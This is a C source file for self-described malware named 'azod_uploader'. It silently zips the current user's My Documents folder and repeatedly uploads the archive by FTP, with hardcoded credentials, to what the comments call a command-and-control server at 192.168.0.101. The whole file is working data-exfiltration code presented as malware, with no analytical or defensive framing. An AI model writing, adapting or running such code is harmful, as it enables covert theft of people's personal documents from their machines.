/* Name       : azod_uploader malware
 * Author     : King Azod
 * Version    : 1.0
 * Description: the azod_uploader malware zips up all files and directories
 * in the current user's my documents directory into a single zipfiles name <hostname>.zip.
 * The zipfile is then saved in the root of C: and FTP'd out to one of Azod's command and
 * control servers.
 */

#include <wininet.h>

int ftpExfil(LPCSTR server, LPCSTR user, LPCSTR password, LPCSTR localFile, LPCSTR remoteFile)
{
	HINTERNET hInternet;
	HINTERNET hFtp;

	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL,NULL,0);
	hFtp = InternetConnect(hInternet, server, INTERNET_DEFAULT_FTP_PORT, user, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);

	FtpPutFile(hFtp, localFile, remoteFile, FTP_TRANSFER_TYPE_BINARY, 0);

	//InternetCloseHandle(hFtp);
	//InternetCloseHandle(hInternet);


	return 0;
}

void collect_data(char* hostname, char* homepath)
{
    char arguments[100];

    strcpy(arguments, "zip ");
    strcat(arguments,"-r ");
    strcat(arguments,"C:\\");
    strcat(arguments,hostname);
    strcat(arguments,".zip \"C:");
    strcat(arguments,homepath);
    strcat(arguments,"\\My Documents\"");

    WinExec(arguments,SW_HIDE);

}

int main(int argc, _TCHAR* argv[])
{

    char* homepath;
    char* hostname;

    char localfile[100];

    char* remotefile;
    char* zipex;
    zipex = ".zip";

    homepath = getenv("HOMEPATH");
    hostname = getenv("COMPUTERNAME");


    strcpy(localfile,"C:\\");
    strcat(localfile,hostname);
    strcat(localfile,".zip");

    remotefile = hostname;
    strcat(remotefile,zipex);

    //There is where we turn dollas' into donuts.

    while (true)
    {

        //this part aggregates the contents of the current user's "my documents" folder.
        collect_data(hostname,homepath);

        //this ships off the goods to the C2 server.
        ftpExfil ("192.168.0.101", "azod", "azodisking",localfile,remotefile);

        //sleep!
        Sleep(5000);

    }


    return 0;
}
